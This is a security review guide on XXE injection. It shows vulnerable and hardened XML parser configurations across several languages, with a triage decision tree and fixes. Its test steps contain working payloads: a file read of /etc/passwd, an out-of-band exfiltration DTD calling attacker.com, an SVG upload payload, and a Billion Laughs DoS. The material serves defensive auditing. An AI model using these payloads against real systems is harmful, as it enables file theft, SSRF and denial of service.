# XML External Entity (XXE) Injection

XXE exploits XML parsers that process external entity declarations in DTDs. Attackers
read local files, perform SSRF, exfiltrate data out-of-band, or trigger DoS via entity
expansion (Billion Laughs). XXE surfaces in API endpoints, file uploads (SVG, DOCX,
XLSX, SOAP), configuration parsing, and RSS/Atom feeds.

## Methodology

### Step 1: Identify All XML Parsing Entry Points

```python
# Python — vulnerable by default
import xml.etree.ElementTree as ET      # Entities in < 3.8
from lxml import etree                   # resolve_entities=True by default
import xml.dom.minidom                   # Vulnerable by default
import xml.sax                           # Vulnerable by default
# Safe alternative
from defusedxml.ElementTree import parse # Blocks XXE by default
```

```java
// Java — all vulnerable by default
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
SAXParserFactory spf = SAXParserFactory.newInstance();
XMLInputFactory xif = XMLInputFactory.newInstance();
TransformerFactory tf = TransformerFactory.newInstance();
```

```csharp
// .NET
XmlDocument doc = new XmlDocument();     // Vulnerable if XmlResolver set
XmlTextReader reader = new XmlTextReader(); // Vulnerable (deprecated)
XmlReader reader = XmlReader.Create();   // Safe in .NET 4.5.2+
```

```php
simplexml_load_string($xml);   // Vulnerable if LIBXML_NOENT
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT);  // Entity substitution enabled
```

### Step 2: Check Parser Configuration for Entity Processing

```java
// Java SECURE configuration
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Java VULNERABLE (no features set)
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
Document doc = db.parse(userInput);  // XXE possible
```

```python
# lxml SECURE
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
tree = etree.parse(source, parser)

# lxml VULNERABLE (defaults)
tree = etree.parse(user_input)  # resolve_entities=True by default
```

### Step 3: Test Classic XXE File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

Check protocols: `file://` (read), `http://` (SSRF), `ftp://` (exfil),
`expect://` (PHP RCE), `jar://` (Java archive access).

### Step 4: Test Blind XXE via Out-of-Band Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

```xml
<!-- evil.dtd on attacker server -->
<!ENTITY % payload "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%payload;
```

### Step 5: Test XXE via File Uploads

```python
# SVG files are XML
svg_payload = '''<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>'''
# DOCX/XLSX: inject XXE into internal XML parts (word/document.xml, etc.)
# Libraries: openpyxl, python-docx, cairosvg all parse XML internally
```

### Step 6: Test Billion Laughs (Entity Expansion DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY l2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;">
  <!ENTITY l4 "&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;">
  <!ENTITY l5 "&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;">
  <!ENTITY l6 "&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;">
]>
<root>&l6;</root>
```

Expands to ~10^6 copies of "lol". Even parsers blocking external entities may allow
internal entity expansion.

### Step 7: Verify Defenses Are Correctly Applied

```python
# GOOD: defusedxml wraps stdlib parsers with safe defaults
from defusedxml import ElementTree as ET
tree = ET.parse(user_input)  # Raises EntitiesForbidden

# BAD: importing defusedxml but using stdlib anyway
import defusedxml  # unused!
import xml.etree.ElementTree as ET
tree = ET.parse(user_input)  # STILL VULNERABLE
```

```java
// Java — verify ALL features are set near DocumentBuilderFactory:
// 1. disallow-doctype-decl = true  (blocks DTD entirely — sufficient alone)
//    OR all of: external-general-entities=false, external-parameter-entities=false,
//    load-external-dtd=false, setExpandEntityReferences(false)
```

## Decision Tree

```
Code parses XML input?
|
+-- NO --> SAFE
|
+-- YES
    |
    DTD processing disabled entirely?
    |
    +-- YES (disallow-doctype-decl or equivalent)
    |   +-- Entity expansion limits? YES --> SAFE / NO --> HARDENED (Low)
    |
    +-- NO
        |
        External entities disabled?
        |
        +-- YES --> Internal expansion limited?
        |   +-- YES --> HARDENED (Medium)
        |   +-- NO  --> VULNERABLE (High) — Billion Laughs
        |
        +-- NO --> Untrusted input?
            +-- YES --> VULNERABLE (Critical) — Full XXE
            +-- NO  --> HARDENED (Medium)
```

## Real-World Examples

### Example 1: XXE in Java REST API

```java
@POST @Path("/import") @Consumes(MediaType.APPLICATION_XML)
public Response importData(InputStream xmlInput) {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(xmlInput);  // No security features
    NodeList items = doc.getElementsByTagName("item");
    return Response.ok().build();
}
```

**Why vulnerable:** Default `DocumentBuilderFactory` enables DTD processing and external
entity resolution. Any DTD payload is processed.

**Impact:** File disclosure, SSRF to internal services/cloud metadata, DoS.

**Fix:**
```java
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### Example 2: XXE via XLSX Upload in Python

```python
@app.route('/upload', methods=['POST'])
def upload_spreadsheet():
    file = request.files['spreadsheet']
    file.save('/tmp/upload.xlsx')
    wb = openpyxl.load_workbook('/tmp/upload.xlsx')
    data = [[cell.value for cell in row] for row in wb.active.iter_rows()]
    return jsonify(data)
```

**Why vulnerable:** XLSX files are ZIP archives containing XML. Attacker injects XXE
into internal XML parts (xl/sharedStrings.xml). The underlying XML parser processes entities.

**Impact:** Server file read, SSRF, data exfiltration from internal network.

**Fix:**
```python
import defusedxml
defusedxml.defuse_stdlib()  # Monkey-patches all stdlib XML parsers
wb = openpyxl.load_workbook('/tmp/upload.xlsx', read_only=True)
```

### Example 3: Blind XXE in PHP SOAP Service

```php
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT);  // Substitutes entities!
$xpath = new DOMXPath($dom);
echo $xpath->query('//request/data')->item(0)->nodeValue;
```

**Why vulnerable:** `LIBXML_NOENT` explicitly enables entity substitution on raw user input.

**Impact:** File disclosure, SSRF, RCE via `expect://` wrapper, DoS.

**Fix:**
```php
libxml_disable_entity_loader(true);  // PHP < 8.0
$dom->loadXML($xml, LIBXML_NONET);  // No network access, no LIBXML_NOENT
// PHP 8.0+: external entities disabled by default; never use LIBXML_NOENT
```

## Common False Positive Patterns

1. **defusedxml actively used** — Verify parse calls reference the defusedxml module,
   not stdlib with the same API names.

2. **Java disallow-doctype-decl=true** — Rejects any XML with DOCTYPE, blocking all
   DTD-based attacks. This single feature is sufficient.

3. **.NET 4.5.2+ XmlReader defaults** — `DtdProcessing.Prohibit` is default.
   External entities not resolved. Verify framework version.

4. **Trusted internal config files only** — Parsing known XML configs from deployment
   (not user-supplied) is not exploitable, though hardening is recommended.

5. **JSON/YAML-only endpoints** — If framework strictly enforces Content-Type and
   never invokes an XML parser, XXE cannot occur.

6. **PHP 8.0+ without LIBXML_NOENT** — External entity loading off by default in
   libxml2 2.9+. No entities resolved unless LIBXML_NOENT is explicitly passed.

7. **XMLInputFactory with IS_SUPPORTING_EXTERNAL_ENTITIES=false** — Java StAX parsers
   with explicit external entity disablement block XXE.
